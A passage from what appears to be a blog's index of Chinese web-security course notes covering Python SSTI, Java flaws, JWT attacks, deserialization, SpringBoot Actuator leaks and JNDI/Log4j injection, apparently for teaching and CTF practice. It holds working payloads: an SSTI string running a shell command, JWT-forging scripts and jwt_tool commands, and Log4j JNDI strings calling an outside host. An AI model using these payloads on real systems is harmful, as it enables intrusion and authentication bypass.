class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</span><br></pre></td></tr></table></figure><ul><li>7、Python-SSTI项目<br>黑盒中建议判断利用：<br><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br><a href="https://github.com/vladko312/SSTImap">https://github.com/vladko312/SSTImap</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>69WEB攻防-JAVA安全4</title>
      <link href="/2023/12/09/69WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A84/"/>
      <url>/2023/12/09/69WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A84/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>84、Java安全-Druid监控-未授权访问&amp;信息泄漏</li><li>85、Java安全-Swagger接口-文档导入&amp;联动批量测试</li><li>86、Java安全-JWT令牌攻防-空算法&amp;未签名&amp;密匙提取</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/12/09/69WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A84/JWT1.png"><br> <img src="/2023/12/09/69WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A84/JWT2.png"><br> <img src="/2023/12/09/69WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A84/JWT3.png"></p><h2 id="Java安全-Druid监控-未授权访问-信息泄漏"><a href="#Java安全-Druid监控-未授权访问-信息泄漏" class="headerlink" title="Java安全-Druid监控-未授权访问&amp;信息泄漏"></a>Java安全-Druid监控-未授权访问&amp;信息泄漏</h2><p>参考：<a href="https://developer.aliyun.com/article/1260382">https://developer.aliyun.com/article/1260382</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池。Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控。当开发者配置不当时就可能造成未授权访问漏洞。<br>攻击点：<br>1、直接拼接URL路径，尝试能否直接未授权访问系统功能点。<br>2、结合泄露URL路径和Session信息，利用BurpSuite进行尝试登录。<br>3、利用Cookie编辑器替换Session，再次访问后台路径尝试进入后台。  </p><h2 id="Java安全-Swagger接口-导入-联动批量测试"><a href="#Java安全-Swagger接口-导入-联动批量测试" class="headerlink" title="Java安全-Swagger接口-导入&amp;联动批量测试"></a>Java安全-Swagger接口-导入&amp;联动批量测试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Swagger是一个用于生成、描述和调用RESTful接口的Web服务。就是将项目中所有（想要暴露的）接口展现在页面上，并可以进行接口调用和测试的服务。所以可以对这个接口进行漏洞测试，看是否存在未授权访问、sql注入、文件上传等漏洞。由于接口太多，一个个接口测试的话太费时间，所以一般会采用自动化接口漏洞安全测试。<br>1、自动化发包测试<br>Postman：<a href="https://github.com/hlmd/Postman-cn">https://github.com/hlmd/Postman-cn</a><br>2、自动化漏洞测试<br>联动BurpSuite Xray等  </p><h2 id="Java安全-JWT令牌-空算法-未签名-密匙获取"><a href="#Java安全-JWT令牌-空算法-未签名-密匙获取" class="headerlink" title="Java安全-JWT令牌-空算法&amp;未签名&amp;密匙获取"></a>Java安全-JWT令牌-空算法&amp;未签名&amp;密匙获取</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JSON Web Token(JWT)。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。这使得JWT成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互。  </p><h3 id="JWT识别"><a href="#JWT识别" class="headerlink" title="JWT识别"></a>JWT识别</h3><ul><li><p>1、标头（Header）<br>Header是JWT的第一个部分，是一个JSON对象，主要声明了JWT的签名算法，如”HS256”、”RS256”等，以及其他可选参数，如”kid”、”jku”、”x5u”等<br>alg字段通常用于表示加密采用的算法。如”HS256”、”RS256”等<br>typ字段通常用于表示类型<br>还有一些其他可选参数，如”kid”、”jku”、”x5u”等  </p></li><li><p>2、有效载荷（Payload）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload是JWT的第二个部分，这是一个JSON对象，主要承载了各种声明并传递明文数据，用于存储用户的信息，如id、用户名、角色、令牌生成时间和其他自定义声明。<br>iss：该字段表示jwt的签发者。<br>sub：该jwt面向的用户。<br>aud：jwt的接收方。<br>exp：jwt的过期时间,通常来说是一个时间戳。<br>iat：jwt的签发时间,常来说是一个时间戳。<br>jti：此jwt的唯一标识。通常用于解决请求中的重放攻击。该字段在大多数地方没有被提及或使用。因为使用此字段就意味着必须要在服务器维护一张jti表， 当客户端携带jwt访问的时候需要在jti表中查找这个唯一标识是否被使用过。使用这种方式防止重放攻击似乎让jwt有点怪怪的感觉, 毕竟jwt所宣称的优点就是无状态访问  </p></li><li><p>3、签名（Signature）<br>Signature是对Header和Payload进行签名，具体是用什么加密方式写在Header的alg 中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。<br>对Header和Payload进行签名，具体是用什么加密方式写在Header的alg中。<br>同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。</p></li></ul><p>第一部分：对 JSON 的头部做 base64 编码处理得到<br>第二部分：对 JSON 类型的 payload 做 base64 编码处理得到<br>第三部分：分别对头部和载荷做base64编码，并使用.拼接起来<br>使用头部声明的加密方式，对base64编码前两部分合并的结果加盐加密处理，作为JWT  </p><p>在线解析：<a href="https://jwt.io/">https://jwt.io/</a><br>BURP插件：Hae 或 JSON Web Tokens  </p><h3 id="JWT安全"><a href="#JWT安全" class="headerlink" title="JWT安全"></a>JWT安全</h3><ul><li><p>1、空加密算法（攻击头部不使用加密）<br>签名算法可被修改为none，JWT支持将算法设定为”None”。如果”alg”字段设为”None”，那么签名会被置空，这样任何token都是有效的。  </p></li><li><p>2、未校验签名（攻击签名不使用签名认证）<br>某些服务端并未校验JWT签名，可以尝试修改payload后然后直接请求token或者直接删除signature再次请求查看其是否还有效。  </p></li><li><p>3、暴力破解密钥（攻击签名知道密钥实现重组）<br>针对是对称加密算法（非对称没有用）<br>非对称要使用方法：获取源码或者公钥私钥文件<br>某些签名算法，例如HS256（HMAC+SHA-256），会像密码一样使用一个任意的、独立的字符串作为秘密密钥。这个秘钥如被轻易猜到或暴力破解，则攻击者能以任意的头部和载荷值来创建JWT，然后用密钥重新给令牌签名。  </p></li><li><p>4、其他安全参考：（源码泄漏密匙，Kid注入等）<br><a href="https://blog.csdn.net/weixin_44288604/article/details/128562796">https://blog.csdn.net/weixin_44288604/article/details/128562796</a></p></li></ul><h3 id="JWT利用"><a href="#JWT利用" class="headerlink" title="JWT利用"></a>JWT利用</h3><p>利用项目：<a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a>  </p><ul><li>Web345(None无签名认证)  </li><li>Web346(None算法绕过签名)  </li><li>Web347(弱口令密钥获取)  </li><li>Web348(爆破密钥上题一样)<br>使用None算法</li></ul><p><code>python3 jwt_tool.py JWT_HERE -X a</code><br>自定义修改生成<br><code>python3 jwt_tool.py JWT_HERE -T</code><br>使用字典破解<br><code>python3 jwt_tool.py JWT_HERE -C -d dictionary.txt</code><br>指定密码测试<br><code>python3 jwt_tool.py JWT_HERE -C -p password_here</code></p><ul><li>Web349（公钥私钥泄露）<br>公钥私钥泄露，访问&#x2F;private.key &#x2F;public.key得到公钥密钥<br>服务器私钥生成jwt，利用公钥解密jwt，只要有私钥重新生成  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">public = open(&#x27;private.key&#x27;, &#x27;r&#x27;).read()</span><br><span class="line">payload=&#123;&quot;user&quot;:&quot;admin&quot;&#125;</span><br><span class="line">print(jwt.encode(payload, key=public, algorithm=&#x27;RS256&#x27;))</span><br></pre></td></tr></table></figure></li><li>Web350(密钥混淆攻击RS256&#x3D;&gt;HS256)<br>将RS256算法改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）<br>HS256算法使用密钥为所有消息进行签名和验证。<br>而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var jwt = require(&#x27;jsonwebtoken&#x27;);</span><br><span class="line">var fs = require(&#x27;fs&#x27;);</span><br><span class="line"></span><br><span class="line">var privateKey = fs.readFileSync(&#x27;./public.key&#x27;);</span><br><span class="line">var token = jwt.sign(&#123; user: &#x27;admin&#x27; &#125;, privateKey, &#123; algorithm: &#x27;HS256&#x27; &#125;);</span><br><span class="line">console.log(token)</span><br></pre></td></tr></table></figure></li></ul><h3 id="黑盒JWT测试"><a href="#黑盒JWT测试" class="headerlink" title="黑盒JWT测试"></a>黑盒JWT测试</h3><p>首先找到需要JWT鉴权后才能访问的页面，如个人资料页面，将该请求包重放测试：<br>1）未授权访问：删除Token后仍然可以正常响应对应页面<br>2）敏感信息泄露：通过JWt.io解密出Payload后查看其中是否包含敏感信息，如弱加密的密码等<br>3）破解密钥+越权访问：通过JWT.io解密出Payload部分内容，通过空加密算法或密钥爆破等方式实现重新签发Token并修改Payload部分内容，重放请求包，观察响应包是否能够越权查看其他用户资料<br>4）检查Token时效性：解密查看payload中是否有exp字段键值对（Token过期时间），等待过期时间后再次使用该Token发送请求，若正常响应则存在Token不过期<br>5）通过页面回显进行探测：如修改Payload中键值对后页面报错信息是否存在注入，payload中kid字段的目录遍历问题与sql注入问题  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>68WEB攻防-JAVA安全3</title>
      <link href="/2023/12/08/68WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A83/"/>
      <url>/2023/12/08/68WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A83/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>82、Java安全-原生反序列化-3大类接口函数&amp;利用</li><li>83、Java安全-SpringBoot攻防-泄漏安全&amp;CVE安全</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/12/08/68WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A83/jndi.png"></p><h2 id="Java安全-反序列化-原生序列化类函数"><a href="#Java安全-反序列化-原生序列化类函数" class="headerlink" title="Java安全-反序列化-原生序列化类函数"></a>Java安全-反序列化-原生序列化类函数</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化等。  </p><h3 id="黑盒发现（流量捕获）-白盒发现（特征类接口函数）"><a href="#黑盒发现（流量捕获）-白盒发现（特征类接口函数）" class="headerlink" title="黑盒发现（流量捕获）&#x2F;白盒发现（特征类接口函数）"></a>黑盒发现（流量捕获）&#x2F;白盒发现（特征类接口函数）</h3><h3 id="原生序列化类函数："><a href="#原生序列化类函数：" class="headerlink" title="原生序列化类函数："></a>原生序列化类函数：</h3><p>-SnakeYaml：完整的YAML1.1规范Processor，支持Java对象的序列化&#x2F;反序列化<br>-XMLDecoder：xml语言格式序列化类函数接口<br>-ObjectInputStream.readObject()：任何类如果想要序列化必须实现java.io.Serializable接口  </p><h3 id="利用项目："><a href="#利用项目：" class="headerlink" title="利用项目："></a>利用项目：</h3><p>-Yakit <a href="https://yaklang.com/">https://yaklang.com/</a><br>-<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a><br>-<a href="https://github.com/NotSoSecure/SerializedPayloadGenerator">https://github.com/NotSoSecure/SerializedPayloadGenerator</a><br>(基于-ObjectInputStream.readObject()的利用工具)</p><h2 id="Java安全-SpringBoot框架-泄漏-CVE"><a href="#Java安全-SpringBoot框架-泄漏-CVE" class="headerlink" title="Java安全-SpringBoot框架-泄漏&amp;CVE"></a>Java安全-SpringBoot框架-泄漏&amp;CVE</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SpringBoot Actuator模块提供了生产级别的功能，比如健康检查，审计，指标收集，HTTP跟踪等，帮助我们监控和管理Spring Boot应用。</p><h3 id="检测清单："><a href="#检测清单：" class="headerlink" title="检测清单："></a>检测清单：</h3><p><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a>  </p><h3 id="1-1黑盒发现（人工识别，BP插件）"><a href="#1-1黑盒发现（人工识别，BP插件）" class="headerlink" title="1.1黑盒发现（人工识别，BP插件）"></a>1.1黑盒发现（人工识别，BP插件）</h3><p><a href="https://github.com/API-Security/APIKit">https://github.com/API-Security/APIKit</a>  </p><h3 id="1-2白盒发现（pom-xml-引用库）"><a href="#1-2白盒发现（pom-xml-引用库）" class="headerlink" title="1.2白盒发现（pom.xml,引用库）"></a>1.2白盒发现（pom.xml,引用库）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>Actuator设置全部暴露：<br>management.endpoints.web.exposure.include&#x3D;*  </p><h3 id="2、泄漏安全（配置密码，AK-SK等）"><a href="#2、泄漏安全（配置密码，AK-SK等）" class="headerlink" title="2、泄漏安全（配置密码，AK&#x2F;SK等）"></a>2、泄漏安全（配置密码，AK&#x2F;SK等）</h3><p><a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a><br><a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a>  </p><h3 id="3、漏洞安全（利用类，CVE漏洞等）"><a href="#3、漏洞安全（利用类，CVE漏洞等）" class="headerlink" title="3、漏洞安全（利用类，CVE漏洞等）"></a>3、漏洞安全（利用类，CVE漏洞等）</h3><p><a href="https://github.com/AabyssZG/SpringBoot-Scan">https://github.com/AabyssZG/SpringBoot-Scan</a><br><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>67WEB攻防-JAVA安全2</title>
      <link href="/2023/12/07/67WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A82/"/>
      <url>/2023/12/07/67WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A82/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>79、Java安全-RCE执行-5大类函数调用</li><li>80、Java安全-JNDI注入-RMI&amp;LDAP&amp;高版本</li><li>81、Java安全-不安全组件-Shiro&amp;FastJson&amp;JackJson&amp;XStream&amp;Log4j</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/12/07/67WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A82/jndi1.png"><br> <img src="/2023/12/07/67WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A82/jndi2.png"></p><h2 id="Java安全-RCE执行-5大类函数调用"><a href="#Java安全-RCE执行-5大类函数调用" class="headerlink" title="Java安全-RCE执行-5大类函数调用"></a>Java安全-RCE执行-5大类函数调用</h2><p>-Groovy<br>-RuntimeExec<br>-ProcessImpl<br>-ProcessBuilder<br>-ScriptEngineManager<br>检测：（大部分白盒）<br>黑盒看参数名和参数值<br>白盒看类函数名和可控变量  </p><h2 id="Java安全-JNDI注入-RMI-LDAP-版本"><a href="#Java安全-JNDI注入-RMI-LDAP-版本" class="headerlink" title="Java安全-JNDI注入-RMI&amp;LDAP&amp;版本"></a>Java安全-JNDI注入-RMI&amp;LDAP&amp;版本</h2><p>什么是jndi注入<br>为什么有jndi注入<br>JDNI注入安全问题（RCE）<br>JDNI注入利用条件（看上图）<br>参考：<a href="https://blog.csdn.net/dupei/article/details/120534024">https://blog.csdn.net/dupei/article/details/120534024</a>  </p><h2 id="JNDI注入-RMI-LDAP服务-高版本"><a href="#JNDI注入-RMI-LDAP服务-高版本" class="headerlink" title="JNDI注入-RMI&amp;LDAP服务&amp;高版本"></a>JNDI注入-RMI&amp;LDAP服务&amp;高版本</h2><p>资料：<a href="https://docs.qq.com/doc/DQ3JySmFPZXJkUVBL">https://docs.qq.com/doc/DQ3JySmFPZXJkUVBL</a><br>第37天：安全开发-JavaEE应用&amp;JNDI注入&amp;RMI服务&amp;LDAP服务&amp;JDK绕过&amp;调用链类  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。<br>RMI：远程方法调用注册表<br>LDAP：轻量级目录访问协议  </p><p>调用检索：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.InitialContext.lookup()</span><br><span class="line">在RMI服务中调用了InitialContext.lookup()的类有：</span><br><span class="line">org.springframework.transaction.jta.JtaTransactionManager.readObject()</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl.execute()</span><br><span class="line">javax.management.remote.rmi.RMIConnector.connect()</span><br><span class="line">org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在LDAP服务中调用了InitialContext.lookup()的类有：</span><br><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring LdapTemplate.lookup()</span><br><span class="line">LdapTemplate.lookupContext()</span><br></pre></td></tr></table></figure><p>检测：<br>无黑盒思路<br>白盒看类函数名和可控变量  </p><h2 id="Java安全-不安全组件-JSON-XML-验证-日志"><a href="#Java安全-不安全组件-JSON-XML-验证-日志" class="headerlink" title="Java安全-不安全组件-JSON&amp;XML&amp;验证&amp;日志"></a>Java安全-不安全组件-JSON&amp;XML&amp;验证&amp;日志</h2><h3 id="Log4j："><a href="#Log4j：" class="headerlink" title="Log4j："></a>Log4j：</h3><p>Apache的一个开源项目，是一个基于Java的日志记录框架。<br>历史漏洞：<a href="https://avd.aliyun.com/search?q=Log4j">https://avd.aliyun.com/search?q=Log4j</a>  </p><h3 id="Shiro："><a href="#Shiro：" class="headerlink" title="Shiro："></a>Shiro：</h3><p>Java安全框架，能够用于身份验证、授权、加密和会话管理。<br>历史漏洞：<a href="https://avd.aliyun.com/search?q=Shiro">https://avd.aliyun.com/search?q=Shiro</a>  </p><h3 id="Jackson："><a href="#Jackson：" class="headerlink" title="Jackson："></a>Jackson：</h3><p>当下流行的json解释器，主要负责处理Json的序列化和反序列化。<br>历史漏洞：<a href="https://avd.aliyun.com/search?q=Jackson">https://avd.aliyun.com/search?q=Jackson</a>  </p><h3 id="XStream："><a href="#XStream：" class="headerlink" title="XStream："></a>XStream：</h3><p>开源Java类库，能将对象序列化成XML或XML反序列化为对象<br>历史漏洞：<a href="https://avd.aliyun.com/search?q=XStream">https://avd.aliyun.com/search?q=XStream</a>  </p><h3 id="FastJson："><a href="#FastJson：" class="headerlink" title="FastJson："></a>FastJson：</h3><p>阿里巴巴公司开源的json解析器，它可以解析JSON格式的字符串，支持将JavaBean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。<br>历史漏洞：<a href="https://avd.aliyun.com/search?q=fastjson">https://avd.aliyun.com/search?q=fastjson</a>   </p><h3 id="黑盒测试不安全组件漏洞："><a href="#黑盒测试不安全组件漏洞：" class="headerlink" title="黑盒测试不安全组件漏洞："></a>黑盒测试不安全组件漏洞：</h3><p>见后续章节漏洞复现利用课程</p><h3 id="白盒审计不安全组件漏洞："><a href="#白盒审计不安全组件漏洞：" class="headerlink" title="白盒审计不安全组件漏洞："></a>白盒审计不安全组件漏洞：</h3><ul><li>FastJson审计<br>1、看引用组件版本及实现</li></ul><p><code>JSON.parse() JSON.parseObject()</code><br>2、找可控变量及访问实现<br><code>admin/product propertyJson</code><br>3、测试出网回显调用访问  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">- Log4j审计  </span><br><span class="line">1、看引用组件版本及实现  </span><br><span class="line">```logger.info logger.error```</span><br><span class="line">2、找可控变量及访问实现  </span><br><span class="line">```admin/uploadAdminHeadImage originalFileName```</span><br><span class="line">3、测试出网回显调用访问  </span><br></pre></td></tr></table></figure><p>${jndi:ldap:&#x2F;&#x2F;jebqzwhwtn.dnstunnel.run}<br>${jndi:rmi:&#x2F;&#x2F;47.94.236.117:1099&#x2F;l6v1wz}</p><pre><code>- 不回显常见判断通用方法：  1、直接将执行结果写入到静态资源文件里，如html、js等，然后访问。  2、通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了。  3、接将命令执行结果回显到请求Poc的HTTP响应中。  不回显常见判断细节方法：  例：https://mp.weixin.qq.com/s/qhLhgbNwocC07AN48eQ0sw  </code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>66WEB攻防-JAVA安全1</title>
      <link href="/2023/12/06/66WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A81/"/>
      <url>/2023/12/06/66WEB%E6%94%BB%E9%98%B2-JAVA%E5%AE%89%E5%85%A81/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>75、Java安全-SQL注入-JDBC&amp;MyBatis</li><li>76、Java安全-XXE注入-Reader&amp;Builder</li><li>77、Java安全-SSTI模版-Thymeleaf&amp;URL</li><li>78、Java安全-SPEL表达式-SpringBoot框架</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><h2 id="JAVA安全"><a href="#JAVA安全" class="headerlink" title="JAVA安全"></a>JAVA安全</h2><p><a href="https://github.com/bewhale/JavaSec">https://github.com/bewhale/JavaSec</a><br><a href="https://github.com/j3ers3/Hello-Java-Sec">https://github.com/j3ers3/Hello-Java-Sec</a><br><a href="https://mp.weixin.qq.com/s/ZO4tpz9ys6kCIryNhA5nYw">https://mp.weixin.qq.com/s/ZO4tpz9ys6kCIryNhA5nYw</a>  </p><h2 id="Java安全-SQL注入-JDBC-MyBatis"><a href="#Java安全-SQL注入-JDBC-MyBatis" class="headerlink" title="Java安全-SQL注入-JDBC&amp;MyBatis"></a>Java安全-SQL注入-JDBC&amp;MyBatis</h2><h3 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h3><ul><li>1、采用Statement方法拼接SQL语句  </li><li>2、PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。  </li><li>3、JDBCTemplate是Spring对JDBC的封装，如果使用拼接语句便会产生注入<br>安全写法：SQL语句占位符（?） + PrepareStatement预编译</li></ul><h3 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MyBatis支持两种参数符号，一种是#，另一种是$，#使用预编译，$使用拼接SQL。  </p><ul><li>1、order by注入：由于使用#{}会将对象转成字符串，形成order by “user” desc造成错误，因此很多研发会采用${}来解决，从而造成注入.</li><li>2、like 注入：模糊搜索时，直接使用’%#{q}%’ 会报错，部分研发图方便直接改成’%${q}%’从而造成注入.</li><li>3、in注入：in之后多个id查询时使用 # 同样会报错，从而造成注入.</li></ul><h3 id="代码审计案例：inxedu后台MyBatis注入"><a href="#代码审计案例：inxedu后台MyBatis注入" class="headerlink" title="代码审计案例：inxedu后台MyBatis注入"></a>代码审计案例：inxedu后台MyBatis注入</h3><h2 id="Java安全-XXE注入-Reader-Builder"><a href="#Java安全-XXE注入-Reader-Builder" class="headerlink" title="Java安全-XXE注入-Reader&amp;Builder"></a>Java安全-XXE注入-Reader&amp;Builder</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XXE (XML External Entity Injection), 